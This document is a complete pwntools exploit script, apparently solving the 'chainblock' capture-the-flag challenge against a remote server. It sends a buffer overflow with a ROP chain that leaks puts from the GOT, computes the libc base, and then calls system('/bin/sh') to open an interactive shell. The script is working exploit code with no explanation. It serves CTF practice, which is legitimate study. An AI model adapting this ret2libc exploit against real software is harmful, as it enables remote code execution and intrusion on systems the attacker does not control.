from pwn import * 

BIN = "./chainblock"
libc = ELF("libc.so.6")
elf = ELF(BIN)
name = b"Techlead "
pop = 0x0000000000401493 #pop rdi ; ret
ret = 0x000000000040101a

def exploit():
	payload = name + b"a"*(256-len(name)) + b"b"*8
	payload += p64(pop)
	payload += p64(elf.symbols['got.puts'])
	payload += p64(elf.symbols['plt.puts'])
	payload += p64(elf.symbols['main'])
	io.sendline(payload)
	io.recvuntil('KYC failed, wrong identity!\n')
	puts = u64((io.recv(6)+b'\x00'*2))

	libc_base = puts - libc.symbols['puts']
	print("Libc base:", hex(libc_base))
	sys_offset = libc.symbols['system']
	bin_offset = next(libc.search(b"/bin/sh"))
	sys_call = libc_base + sys_offset
	bin_call = libc_base + bin_offset

	payload = name + b"a"*(256-len(name)) + b"b"*8
	payload += p64(pop)
	payload += p64(bin_call)
	payload += p64(ret)
	payload += p64(sys_call)
	io.sendline(payload)
	io.interactive()
	

#io = process(BIN)
io = remote('pwn.be.ax',5000)
exploit()